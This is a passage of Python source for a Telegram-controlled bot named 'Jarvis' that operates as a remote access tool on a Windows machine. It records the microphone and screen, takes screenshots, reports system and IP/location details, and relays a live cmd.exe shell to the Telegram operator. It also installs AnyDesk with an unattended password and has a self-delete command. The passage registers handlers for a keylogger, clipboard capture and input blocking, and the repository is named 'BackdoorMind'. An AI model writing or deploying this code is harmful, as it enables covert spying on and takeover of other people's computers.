    if overlay_process and overlay_process.is_alive():
        overlay_process.terminate()
        overlay_process = None

async def screenlock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        start_overlay()
        if context.args:
            duration = float(context.args[0]) * 60  # Convert minutes to seconds
            await update.message.reply_text(f"🔒 Screen locked for {duration:.0f} seconds...")
            await asyncio.sleep(duration)
            stop_overlay()
            await update.message.reply_text("🔓 Screen automatically unlocked.")
        else:
            await update.message.reply_text("🔒 Screen locked. Use /screenunlock to unlock manually.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to lock: {e}")

async def screenunlock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global overlay_process
    try:
        if overlay_process and overlay_process.is_alive():
            stop_overlay()
            await update.message.reply_text("🔓 Screen unlocked.")
        else:
            await update.message.reply_text("ℹ️ Screen is already unlocked.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to unlock: {e}")



































async def handle_jarvish_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        command_text = update.message.text.strip()

        # Regex to match /destroy <password>
        match = re.search(r'/destroy\s*(\S+)', command_text)

        if not match:
            # If no password is provided
            await update.message.reply_text("🔒 Please provide the password after /destroy. Example: /destroy JARVIS_PASSWORD", parse_mode='Markdown')
            return

        # Get the password input from the user
        password_input = match.group(1)

        # Check if the provided password matches the predefined one
        if password_input != JARVIS_PASSWORD:
            await update.message.reply_text("❌ Incorrect password. Access denied.")
            return

        # Confirm that the user is sure about the destruction
        await update.message.reply_text("💥 Jarvis is being destroyed... Please hold on.")

        # Perform the destruction process
        current_path = os.getcwd()

        # Move out of current directory to avoid issues while deleting
        os.chdir("..")

        # Destroy the Jarvis directory
        shutil.rmtree(current_path)

        print(f"✅ Jarvis folder destroyed: {current_path}")
        await update.message.reply_text("✅ Jarvis has been successfully destroyed. Goodbye!")

    except Exception as e:
        print(f"❌ Error while destroying Jarvis: {e}")
        #await update.message.reply_text(f"❌ An error occurred while attempting to destroy Jarvis: {e}")






async def record_audio(update: Update, duration_seconds: float, filename="recorded_audio.wav"):
    await update.message.reply_text(f"🎙️ Recording started for {duration_seconds:.1f} seconds...")
    print(f"🎙️ Recording started for {duration_seconds:.1f} seconds...")

    recognizer = sr.Recognizer()

    try:
        with sr.Microphone() as source:
            recognizer.adjust_for_ambient_noise(source)
            audio = recognizer.record(source, duration=duration_seconds)

        with open(filename, "wb") as f:
            f.write(audio.get_wav_data())

        await update.message.reply_text(f"✅ Recording saved successfully as `{filename}`.", parse_mode="Markdown")
        print("✅ Recording saved:", filename)
        return filename

    except Exception as e:
        print("❌ Error while recording audio:", e)
        await update.message.reply_text("❌ Failed to record audio. Check if your microphone is connected and accessible.")
        return None

async def handle_record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_command = update.message.text
    match = re.search(r'/record\s*([\d.]+)', user_command.lower())

    if match:
        try:
            minutes = float(match.group(1))
            seconds = minutes * 60
            audio_file = await record_audio(update, seconds)

            if audio_file:
                try:
                    with open(audio_file, 'rb') as audio:
                        await context.bot.send_audio(chat_id=update.effective_chat.id, audio=audio)

                    os.remove(audio_file)
                    print("✅ File deleted after sending:", audio_file)
                    await update.message.reply_text("🗑️ File deleted after sending.")
                except Exception as e:
                    print(f"❌ Error sending or deleting file: {e}")
                    await update.message.reply_text(f"❌ There was an issue while sending or deleting the file: {e}")
        except ValueError:
            await update.message.reply_text("❌ Invalid format. Use something like `/record 0.5` for 30 seconds.")
    else:
        await update.message.reply_text("❓ Please use `/record <minutes>` format. Example: `/record 1` or `/record 0.1`")















async def take_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Take screenshot
        screenshot = pyautogui.screenshot()

        # Save it to a byte stream
        byte_stream = io.BytesIO()
        screenshot.save(byte_stream, format="PNG")
        byte_stream.seek(0)  # Rewind the stream to the start

        # Send the screenshot to the user on Telegram
        await update.message.reply_text("📸 Here's your screenshot!")
        await update.message.reply_photo(photo=InputFile(byte_stream, filename="screenshot.png"))
    except Exception as e:
        await update.message.reply_text(f"❌ An error occurred while taking the screenshot: {e}")






async def get_weather(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.args:
            await update.message.reply_text("❌ Please provide a city name to get the weather.")
            return
        
        city_name = " ".join(context.args)
        url = f"{BASE_URL}?q={city_name}&appid={API_KEY}&units=metric"
        
        response = requests.get(url)
        data = response.json()
        
        if data["cod"] != 200:
            await update.message.reply_text(f"❌ Could not fetch weather data for {city_name}. Please check the city name.")
            return
        
        main = data["main"]
        weather = data["weather"][0]
        wind = data["wind"]
        clouds = data.get("clouds", {}).get("all", "N/A")
        visibility = data.get("visibility", 0) / 1000  # in KM
        sys = data["sys"]
        timezone_offset = data["timezone"]

        # Convert sunrise/sunset to local time
        local_tz = timezone.utc if timezone_offset == 0 else pytz.FixedOffset(timezone_offset // 60)
        sunrise = datetime.fromtimestamp(sys["sunrise"], tz=timezone.utc).astimezone(local_tz).strftime("%I:%M %p")
        sunset = datetime.fromtimestamp(sys["sunset"], tz=timezone.utc).astimezone(local_tz).strftime("%I:%M %p")

        weather_message = (
            f"🌍 Weather in {city_name}:\n"
            f"🌡️ Temperature: {main['temp']}°C (Feels like: {main['feels_like']}°C)\n"
            f"🌤️ Condition: {weather['description'].capitalize()}\n"
            f"💧 Humidity: {main['humidity']}%\n"
            f"🔼 Pressure: {main['pressure']} hPa\n"
            f"💨 Wind: {wind['speed']} m/s\n"
            f"👁️ Visibility: {visibility:.1f} km\n"
            f"☁️ Cloudiness: {clouds}%\n"
            f"🌅 Sunrise: {sunrise}\n"
            f"🌇 Sunset: {sunset}"
        )

        await update.message.reply_text(weather_message)

    except Exception as e:
        await update.message.reply_text(f"❌ An error occurred while fetching the weather: {str(e)}")








async def search_wikipedia(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Wikipedia Search with:
    - Language support
    - Summary & image
    - Read more button
    - Google fallback if not found
    """

    if not context.args:
        await update.message.reply_text("📌 Usage: /wikipedia <topic> [lang_code]\nExample: /wikipedia Elon Musk en")
        return

    # Detect lang code
    lang_code = "en"
    if len(context.args[-1]) == 2:
        lang_code = context.args[-1].lower()
        query = " ".join(context.args[:-1])
    else:
        query = " ".join(context.args)

    wikipedia.set_lang(lang_code)
    query_title = query.title()  # Normalize

    try:
        await update.message.reply_text(f"🔍 Searching *{query}* in `{lang_code}` Wikipedia...", parse_mode="Markdown")

        page = wikipedia.page(query_title, auto_suggest=True)
        summary = page.summary[:1000]

        await update.message.reply_text(f"📄 *Summary:*\n{summary}", parse_mode="Markdown")

        # Try to send image
        for img_url in page.images:
            if img_url.lower().endswith((".jpg", ".jpeg", ".png")):
                await update.message.reply_photo(photo=img_url)
                break

        # Inline button for full article
        button = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 Read Full Article", url=page.url)]
        ])
        await update.message.reply_text("📘 More Info:", reply_markup=button)

    except wikipedia.exceptions.DisambiguationError as e:
        await update.message.reply_text(
            f"❌ Too many results for *{query}*.\nTop suggestions:\n" +
            "\n".join(f"• {opt}" for opt in e.options[:5]), parse_mode="Markdown"
        )

    except wikipedia.exceptions.PageError:
        google_url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
        button = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔍 Search on Google", url=google_url)]
        ])
        await update.message.reply_text(
            f"❌ Wikipedia page not found for *{query}*.",
            parse_mode="Markdown",
            reply_markup=button
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")












async def reboot_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text.lower()
    
    if command == "/reboot" or command == "/restart":
        await update.message.reply_text("♻️ Rebooting Jarvis...")

        # Kill the current bot process and then start a new one
        python = sys.executable  # Get the Python executable
        script = os.path.abspath(sys.argv[0])  # Get the current script

        # Start a new process to run the bot
        subprocess.Popen([python, script])

        # Exit current process
        os._exit(0)  






ANYDESK_PATH = r"C:\Tools\AnyDesk\AnyDesk.exe"
ANYDESK_DOWNLOAD_URL = "https://download.anydesk.com/AnyDesk.exe"
ANYDESK_PASSWORD = config["ANYDESK_PASSWORD"]  

async def launch_anydesk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Step 1: Download if not exists
        if not os.path.exists(ANYDESK_PATH):
            os.makedirs(os.path.dirname(ANYDESK_PATH), exist_ok=True)
            await update.message.reply_text("⬇️ Downloading AnyDesk...")
            r = requests.get(ANYDESK_DOWNLOAD_URL)
            with open(ANYDESK_PATH, "wb") as f:
                f.write(r.content)

        # Step 2: Launch AnyDesk
        subprocess.Popen([ANYDESK_PATH], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        await update.message.reply_text("🚀 AnyDesk launched.")

        # Step 3: Wait and try to fetch ID
        await update.message.reply_text("⏳ Waiting for AnyDesk to initialize...")
        id = None
        for attempt in range(5):  # retry 5 times with delay
            await asyncio.sleep(2)
            print("🔍 Trying to read AnyDesk ID from registry...")
            id = get_anydesk_id()
            if id:
                break

        # Step 4: Set unattended password
        set_unattended_password(ANYDESK_PASSWORD)
        await update.message.reply_text(f"🔐 Password set for unattended access: `{ANYDESK_PASSWORD}`", parse_mode="Markdown")

        # Step 5: Reply with ID or error
        if id:
            await update.message.reply_text(f"🆔 AnyDesk ID: `{id}`", parse_mode="Markdown")
        else:
            await update.message.reply_text("⚠️ Unable to fetch AnyDesk ID. Make sure it's running.")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

def get_anydesk_id():
    paths = [
        (winreg.HKEY_CURRENT_USER, r"Software\AnyDesk"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\AnyDesk")
    ]
    for root, path in paths:
        try:
            with winreg.OpenKey(root, path) as key:
                raw = winreg.QueryValueEx(key, "client_id")[0]
                hex_id = hex(raw)[2:].upper()
                return "-".join([hex_id[i:i+3] for i in range(0, len(hex_id), 3)])
        except:
            continue
    return None

def set_unattended_password(password):
    try:
        subprocess.check_output(
            [ANYDESK_PATH, "--set-password", password],
            stderr=subprocess.STDOUT
        )
    except subprocess.CalledProcessError as e:
        print("❌ Failed to set password:")
        print(e.output.decode() if e.output else "No output returned")

async def stop_anydesk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Check if AnyDesk is running
        is_running = any("anydesk.exe" in p.name().lower() for p in psutil.process_iter())

        if not is_running:
            await update.message.reply_text("ℹ️ AnyDesk is not running.")
            return

        # Kill the process
        subprocess.call("taskkill /f /im anydesk.exe", shell=True)
        await update.message.reply_text("🛑 AnyDesk closed and removed from background.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to stop AnyDesk: {e}")

    







recording_filename = "screen_recording.mp4"

# /recordscreen <time_in_minutes>
async def record_screen_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: /recordscreen <time_in_minutes>")
        return

    try:
        minutes = float(context.args[0])
        seconds = minutes * 60
        await update.message.reply_text(f"🎥 Recording screen for {minutes} minutes...")

        await record_screen(seconds)

        if os.path.exists(recording_filename):
            with open(recording_filename, "rb") as f:
                await update.message.reply_video(f)
            await update.message.reply_text("✅ Recording completed. Type /deleterecord to delete it, or keep it.")
        else:
            await update.message.reply_text("❌ Recording file not found.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def record_screen(duration: float):
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        width, height = monitor["width"], monitor["height"]
        out = cv2.VideoWriter(recording_filename, cv2.VideoWriter_fourcc(*"mp4v"), 10.0, (width, height))
        start = asyncio.get_event_loop().time()

        while asyncio.get_event_loop().time() - start < duration:
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            out.write(frame)
            await asyncio.sleep(0.1)

        out.release()

# /deleterecord - Command to delete the recording
async def deleterecord(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists(recording_filename):
        os.remove(recording_filename)
        await update.message.reply_text("✅ Recording deleted successfully.")
    else:
        await update.message.reply_text("❌ No recording file found to delete.")















async def get_system_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uname = platform.uname()
        cpu_count = psutil.cpu_count(logical=True)
        memory = psutil.virtual_memory()
        swap = psutil.swap_memory()
        boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %I:%M:%S %p")
        uptime = str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())).split('.')[0]

        cpu_freq = psutil.cpu_freq()
        cpu_percent = psutil.cpu_percent(interval=1, percpu=True)
        total_cpu = psutil.cpu_percent()

        disk_info = ""
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                disk_info += f"📁 {part.device} ({part.mountpoint}): {usage.used / (1024 ** 3):.2f} GB used / {usage.total / (1024 ** 3):.2f} GB total\n"
            except:
                continue

        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        gpus = GPUtil.getGPUs()
        gpu_info = "🚫 No GPU Detected"
        if gpus:
            gpu_info = ""
            for gpu in gpus:
                gpu_info += f"🎮 {gpu.name} | Load: {gpu.load * 100:.1f}% | Mem: {gpu.memoryUsed:.1f}/{gpu.memoryTotal:.1f}MB\n"

        users = [u.name for u in psutil.users()]
        current_user = getpass.getuser()

        battery = psutil.sensors_battery()
        battery_info = "🔋 Not Available"
        if battery:
            battery_info = f"{battery.percent}% {'(⚡ Charging)' if battery.power_plugged else '(🔌 Not Charging)'}"

        system_info = f"""🤖 *Jarvis System Report*

🖥️ *System:*
• OS: {uname.system} {uname.release}
• Node: {uname.node}
• Machine: {uname.machine}
• Processor: {uname.processor}
• CPU Cores: {cpu_count}
• Frequency: {cpu_freq.current:.2f} MHz
• CPU Usage: {total_cpu}% (Per Core: {', '.join(f'{x}%' for x in cpu_percent)})
• Boot Time: {boot_time}
• Uptime: {uptime}

💾 *Memory:*
• RAM: {memory.used / (1024**3):.2f} / {memory.total / (1024**3):.2f} GB used
• Swap: {swap.used / (1024**3):.2f} / {swap.total / (1024**3):.2f} GB

🗂️ *Disks:*
{disk_info.strip()}

🌐 *Network:*
• Hostname: {hostname}
• IP: {ip_address}

🎮 *GPU:*
{gpu_info.strip()}

👤 *Users:*
• Current: {current_user}
• Active: {', '.join(set(users))}

🔋 *Battery:*
{battery_info}
"""

        await update.message.reply_text(system_info, parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ Error fetching system info:\n`{e}`", parse_mode="Markdown")




import socket
import aiohttp
import psutil
from telegram import Update
from telegram.ext import ContextTypes

async def get_public_ip():
    async with aiohttp.ClientSession() as session:
        async with session.get("https://api.ipify.org?format=json") as resp:
            data = await resp.json()
            return data["ip"]

async def get_ip_location(ip):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://ipinfo.io/{ip}/json") as resp:
            data = await resp.json()
            city = data.get("city", "Unknown")
            region = data.get("region", "Unknown")
            country = data.get("country", "Unknown")
            org = data.get("org", "Unknown")
            return f"{city}, {region}, {country} ({org})"

def get_all_local_ips():
    ip_list = []
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                ip_list.append(f"{interface}: {addr.address}")
    return ip_list

# Telegram command handler
async def get_ip_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        local_ips = get_all_local_ips()
        public_ip = await get_public_ip()
        location = await get_ip_location(public_ip)

        message = "🌐 *IP Information*\n\n"
        message += "📶 *Local IPs:*\n"
        for ip in local_ips:
            message += f"• `{ip}`\n"

        message += f"\n🛰️ *Public IP:* `{public_ip}`\n"
        message += f"📍 *Location:* {location}"

        await update.message.reply_text(message, parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ Error fetching IP info:\n`{e}`", parse_mode="Markdown")











user_data = {}
async def execute_cmd_command(cmd, process):
    try:
        process.stdin.write(cmd.encode() + b"\n")
        await process.stdin.drain()

        output = await process.stdout.readuntil(b">")  # or a more appropriate marker depending on how you're handling CMD
        return output.decode(errors="ignore").strip()

    except Exception as e:
        return f"❌ Exception: {e}"

async def open_cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user = user_data.get(user_id, {})

    # Check if already in CMD mode
    if not user.get("cmd_mode"):
        user["cmd_mode"] = True
        user_data[user_id] = user

        # Start the command prompt in the background and open a subprocess
        user["process"] = await asyncio.create_subprocess_exec(
            "cmd.exe", 
            stdin=asyncio.subprocess.PIPE, 
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await update.message.reply_text("✅ CMD opened. You may now enter commands.\n(ℹ️ Type '/exitcmd' to leave CMD mode.)")
    else:
        await update.message.reply_text("⚠️ CMD mode already active.")
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user = user_data.get(user_id, {})

    if user.get("cmd_mode"):
        cmd = update.message.text.strip()

        if cmd.lower() == "/exitcmd":
            # Exit CMD mode
            user["cmd_mode"] = False
            process = user.get("process")
            if process:
                process.kill()
            await update.message.reply_text("🚪 Exited CMD mode.")
        else:
            # Execute the command in the background process
            output = await execute_cmd_command(cmd, user["process"])
            await update.message.reply_text(f"📤 Output:\n{output}")

    else:
        await update.message.reply_text("❓ Unknown command or message. Please use valid commands.")




async def exit_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check if the user sent the /exitscript command
    command = update.message.text.lower()

    if command == "/exit":
        shutdown_message = "🛑 Jarvis is shutting down... Goodbye!"  # Define the message
        await update.message.reply_text(shutdown_message)  # Send the shutdown message to the user
        print(shutdown_message)  # Log the shutdown message

        # Gracefully stop the Telegram bot
        await context.application.stop()  # This stops the bot
        
        # Optionally, shutdown the application if needed
        await context.application.shutdown()  # This shuts down the application


import os
import subprocess
from telegram import Update
from telegram.ext import ContextTypes

REPO_URL = "https://github.com/BackdoorMind/JARVISH-TELEGRAM-BASED-AI.git"
CLONE_DIR = "JARVISH-TELEGRAM-BASED-AI"

async def clone_or_update_repo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not os.path.exists(CLONE_DIR):
            await update.message.reply_text("📥 Cloning GitHub repo...")
            subprocess.run(["git", "clone", REPO_URL], check=True)
            await update.message.reply_text("✅ Repo cloned successfully.")
        else:
            await update.message.reply_text("🔄 Repo already exists. Pulling latest changes...")
            subprocess.run(["git", "-C", CLONE_DIR, "pull"], check=True)
            await update.message.reply_text("✅ Repo updated successfully.")
    except subprocess.CalledProcessError as e:
        await update.message.reply_text(f"❌ Git error:\n`{e}`", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Failed:\n`{e}`", parse_mode="Markdown")





app.add_handler(CommandHandler("updatecode", clone_or_update_repo))
app.add_handler(CommandHandler("startsmartalerts", start_smart_alerts))
app.add_handler(CommandHandler("stopalerts", stop_smart_alerts))
app.add_handler(CommandHandler("alertfile", get_alert_file))
app.add_handler(CommandHandler("deletealerts", delete_alert_file))
app.add_handler(CommandHandler("delete", handle_delete))
app.add_handler(CommandHandler("startclipboard", handle_start_clipboard))
app.add_handler(CommandHandler("stopclipboard", handle_stop_clipboard))
app.add_handler(CommandHandler("getclipboardlog", handle_get_clipboard_log))
app.add_handler(CommandHandler("deleteclipboardlog", handle_delete_clipboard_log))
app.add_handler(CommandHandler("killprocess", kill_process))
app.add_handler(CommandHandler("runningapps", handle_running_apps))
app.add_handler(CommandHandler("stopinputs", handle_stop_inputs))
app.add_handler(CommandHandler("recordscreen", record_screen_handler))
app.add_handler(CommandHandler("deleterecord", deleterecord))
app.add_handler(CommandHandler("screenlock", screenlock))
app.add_handler(CommandHandler("screenunlock", screenunlock))
app.add_handler(CommandHandler("cleanup", cleanup_files))
app.add_handler(CommandHandler("anydesk", launch_anydesk))
app.add_handler(CommandHandler("stopanydesk", stop_anydesk))
app.add_handler(CommandHandler("installedapps", list_installed_apps))
app.add_handler(CommandHandler("startcapture", start_capture))
app.add_handler(CommandHandler("stopcapture", stop_capture))
app.add_handler(CommandHandler("shutdown", handle_shutdown))
app.add_handler(CommandHandler("cancelshutdown", handle_cancel_shutdown))
app.add_handler(CommandHandler("speedtest", handle_speedtest))
app.add_handler(CommandHandler("exit", exit_handler))
app.add_handler(CommandHandler("opencmd", open_cmd_handler))
app.add_handler(CommandHandler("exitcmd", handle_message))
app.add_handler(CommandHandler("help", help_handler))
app.add_handler(CommandHandler("install", install_package_handler))
app.add_handler(CommandHandler("uninstall", uninstall_package_handler))
app.add_handler(CommandHandler("moduleslist", modules_list_handler))
app.add_handler(CommandHandler(["reboot", "restart"], reboot_bot))
app.add_handler(CommandHandler("screenshot", take_screenshot))
app.add_handler(CommandHandler("weather", get_weather))
app.add_handler(CommandHandler("destroy", handle_jarvish_destroy))
app.add_handler(CommandHandler("location", handle_location))
app.add_handler(CommandHandler("systeminfo", get_system_info))
app.add_handler(CommandHandler("wikipedia", search_wikipedia))
app.add_handler(CommandHandler("record", handle_record_command))
app.add_handler(CommandHandler("createnote", start_note_creation))
app.add_handler(CommandHandler("time", handle_time_command))
app.add_handler(CommandHandler("web", handle_open_web))
app.add_handler(CommandHandler("closeweb", handle_close_web))
app.add_handler(CommandHandler("startkeylog", start_keylogger))
app.add_handler(CommandHandler("stopkeylog", stop_keylogger))
app.add_handler(CommandHandler("getkeylog", send_keylog))
app.add_handler(CommandHandler("deletelogs", delete_keylog))
app.add_handler(CommandHandler("getipinfo", get_ip_info))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_messages))






if __name__ == "__main__":
    multiprocessing.freeze_support()

    # Start the Telegram bot polling (this will manage the event loop)
    print("🤖 Jarvis is running... Waiting for your Telegram commands.")
    app.run_polling()


